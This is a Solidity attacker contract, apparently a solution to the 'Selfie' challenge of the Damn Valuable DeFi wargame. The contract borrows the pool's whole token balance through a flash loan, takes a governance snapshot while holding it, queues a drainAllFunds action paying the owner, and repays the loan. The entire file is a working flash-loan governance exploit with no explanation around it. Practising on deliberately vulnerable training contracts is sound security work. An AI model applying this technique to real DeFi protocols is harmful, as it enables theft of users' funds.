// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

contract SelfiePoolAttacker {

  SelfiePool immutable selfiePool;
  SimpleGovernance immutable simpleGovernance;
  DamnValuableTokenSnapshot immutable damnValuableTokenSnapshot;

  address immutable owner;

  constructor(address _selfiePool, address _simpleGovernance, address _damnValuableTokenSnapshot) {
    selfiePool = SelfiePool(_selfiePool);
    simpleGovernance = SimpleGovernance(_simpleGovernance);
    damnValuableTokenSnapshot = DamnValuableTokenSnapshot(_damnValuableTokenSnapshot);

    owner = msg.sender;
  }

  function attack() external {
    selfiePool.flashLoan(damnValuableTokenSnapshot.balanceOf(address(selfiePool)));
  }

  function receiveTokens(address /* _token */, uint256 _amount) external {
    damnValuableTokenSnapshot.snapshot();
    simpleGovernance.queueAction(address(selfiePool), abi.encodeWithSignature("drainAllFunds(address)", owner), 0);
    damnValuableTokenSnapshot.transfer(address(selfiePool), _amount);
  }
}